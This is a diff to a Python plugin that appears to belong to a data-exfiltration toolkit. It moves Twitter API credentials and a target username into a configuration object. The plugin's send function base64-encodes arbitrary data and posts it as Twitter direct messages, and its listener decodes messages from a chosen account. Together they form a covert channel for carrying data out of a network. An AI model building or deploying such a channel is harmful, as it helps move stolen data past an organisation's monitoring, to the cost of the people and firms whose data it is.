@@ -5,14 +5,6 @@ from tweepy.streaming import StreamListener
 import base64
 import json
 
-CONSUMER_TOKEN = 'xx'
-CONSUMER_SECRET = 'xx'
-
-ACCESS_TOKEN = 'xx'
-ACCESS_TOKEN_SECRET = 'xx'
-
-USERNAME = 'PaulWebSec'
-
 api = None
 auth = None
 app_exfiltrate = None
@@ -24,7 +16,7 @@ class StdOutListener(StreamListener):
     def on_data(self, status):
         try:
             data = json.loads(status)
-            if data['direct_message'] and data['direct_message']['sender_screen_name'] == USERNAME:
+            if data['direct_message'] and data['direct_message']['sender_screen_name'] == config['username']:
                 try:
                     data_to_retrieve = base64.b64decode(data['direct_message']['text'].encode()).decode()
                     app_exfiltrate.log_message(
@@ -42,10 +34,10 @@ def start_twitter():
     global api
     global auth
 
-    auth = OAuthHandler(config['CONSUMER_TOKEN'], config['CONSUMER_SECRET'])
+    auth = OAuthHandler(config['consumer_token'], config['consumer_secret'])
     auth.secure = True
-    auth.set_access_token(config['ACCESS_TOKEN'],
-                          config['ACCESS_TOKEN_SECRET'])
+    auth.set_access_token(config['access_token'],
+                          config['access_token_secret'])
     api = API(auth)
 
 
@@ -53,7 +45,7 @@ def send(data):
     global api
     if (not api):
         start_twitter()
-    api.send_direct_message(user=USERNAME, text=base64.b64encode(data.encode()).decode())
+    api.send_direct_message(user=config['username'], text=base64.b64encode(data.encode()).decode())
 
 
 def listen():
@@ -72,8 +64,7 @@ def proxy():
 class Plugin:
 
     def __init__(self, app, conf):
-        global app_exfiltrate, config, USERNAME
+        global app_exfiltrate, config
         config = conf
-        USERNAME = config['username']
         app.register_plugin('twitter', {'send': send, 'listen': listen, 'proxy': proxy})
         app_exfiltrate = app
